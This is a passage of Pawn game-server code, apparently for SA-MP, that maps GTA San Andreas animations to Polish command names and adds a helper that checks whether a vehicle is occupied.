				lib = "PLAYIDLES";
				name = "stretch";
				customname = "rozciagaj";
			}
			case 60:
			{
				lib = "PLAYIDLES";
				name = "time";
				customname = "zegarek";
			}
			case 61:
			{
				lib = "police";
				name = "CopTraf_Come";
				customname = "chodz";
			}
			case 62:
			{
				lib = "police";
				name = "CopTraf_Stop";
				customname = "stop"; 
			}
			case 63:
			{
				lib = "police";
				name = "Door_Kick";
				customname = "kopnij";
			}
			case 64:
			{
				lib = "rapping";
				name = "Laugh_01";
				customname = "smiech";
			}
			case 65:
			{
				lib = "LOWRIDER";
				name = "RAP_A_Loop";
				customname = "rap";
				repeat = true;
			}
			case 66:
			{
				lib = "LOWRIDER";
				name = "RAP_B_Loop";
				customname = "rap2";
				repeat = true;
			}
			case 67:
			{
				lib = "LOWRIDER";
				name = "RAP_C_Loop";
				customname = "rap3";
				repeat = true;
			}
			case 68:
			{
				lib = "RIOT";
				name = "RIOT_ANGRY";
				customname = "wtf";
			}
			case 69:
			{
				lib = "RIOT";
				name = "RIOT_CHANT";
				customname = "gogo";
				repeat = true;
			}
			case 70:
			{
				lib = "RIOT";
				name = "RIOT_FUKU";
				customname = "fuck2";
			} 
			case 71:
			{
				lib = "RIOT";
				name = "RIOT_PUNCHES";
				customname = "go";
			} 
			case 72:
			{
				lib = "rob_bank";
				name = "SHP_HandsUp_Scr";
				customname = "rece2";
				freeze = true;
			} 
			case 73:
			{
				lib = "RYDER";
				name = "RYD_Beckon_01";
				customname = "chodz2";
			} 
			case 74:
			{
				lib = "shop";
				name = "ROB_Loop_Threat";
				customname = "napad2";
				repeat = true;
			}
			case 75:
			{
				lib = "SMOKING";
				name = "M_smkstnd_loop";
				customname = "papieros3";
				repeat = true;
			} 
			case 76:
			{
				lib = "STRIP";
				name = "strip_A";
				customname = "tancz7";
				repeat = true;
			} 
			case 77:
			{
				lib = "STRIP";
				name = "strip_d";
				customname = "tancz8";
				repeat = true;
			} 
			case 78:
			{
				lib = "STRIP";
				name = "strip_d";
				customname = "tancz8";
				repeat = true;
			} 
			case 79:
			{
				lib = "STRIP";
				name = "strip_f";
				customname = "tancz9";
				repeat = true;
			} 
			case 80:
			{
				lib = "STRIP";
				name = "strip_g";
				customname = "tancz10";
				repeat = true;
			}
			case 81:
			{
				lib = "SUNBATHE";
				name = "ParkSit_W_idleA";
				customname = "lez4";
				repeat = true;
			} 
			case 82:
			{
				lib = "sweet";
				name = "sweet_ass_slap";
				customname = "klepnij";
			} 
			case 83:
			{
				lib = "WUZI";
				name = "Wuzi_follow";
				customname = "naprzod";
			}
			case 84:
			{
				lib = "ON_LOOKERS";
				name = "Pointup_loop";
				customname = "wskaz";
				repeat = true;
			} 
			case 85:
			{
				lib = "ON_LOOKERS";
				name = "point_loop";
				customname = "wskaz2";
				repeat = true;
			} 
			case 86:
			{
				lib = "misc";
				name = "plyr_shkhead";
				customname = "oh";
			} 
			case 87:
			{
				lib = "COP_AMBIENT";
				name = "Coplook_loop";
				customname = "ramiona";
				repeat = true;
			} 
			case 88:
			{
				lib = "CHOPPA";
				name = "CHOPPA_fwd";
				customname = "glowka";
			}
			case 89:
			{
				lib = "ped";
				name = "WALK_civi";
				customname = "idz";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 90:
			{
				lib = "ped";
				name = "WALK_drunk";
				customname = "pijany";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 91:
			{
				lib = "ped";
				name = "WALK_fat";
				customname = "idz2";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 92:
			{
				lib = "ped";
				name = "WALK_fatold";
				customname = "idz3";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 93:
			{
				lib = "ped";
				name = "WALK_gang1";
				customname = "idz4";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 94:
			{
				lib = "ped";
				name = "WALK_gang2";
				customname = "idz5";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 95:
			{
				lib = "ped";
				name = "WALK_old";
				customname = "idz6";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 96:
			{
				lib = "ped";
				name = "WALK_player";
				customname = "idz7";
				lockX = 1;
				lockY = 1;
				repeat = true;
				freeze = true;
				time = 1;
			}
			case 97:
			{
				lib = "benchpress";
				name = "gym_bp_celebrate";
				customname = "zwyciestwo";
			}
			case 98:
			{
				lib = "pool";
				name = "pool_idle_stance";
				customname = "celuj2";
				repeat = true;
			}
			default: break;
		}
		AnimList[i][aName] = name;
		AnimList[i][aLib] = lib;
		AnimList[i][aRepeat] = repeat;
		AnimList[i][aCustomName] = customname;
		AnimList[i][aFreeze] = freeze;
		AnimList[i][aLockX] = lockX;
		AnimList[i][aLockY] = lockY;
		AnimList[i][aTime] = time;
		lockX = 0;
		lockY = 0;
		freeze = false;
		repeat = false;
		time = 0;
	}
}

forward AreAnyPlayersInVehicle(vehicleid);
public AreAnyPlayersInVehicle(vehicleid){
	for(new i=0; i<=GetPlayerPoolSize();i++){
		if(IsPlayerInVehicle(i, vehicleid) ){
			return true;
		}
	}
	return false;
}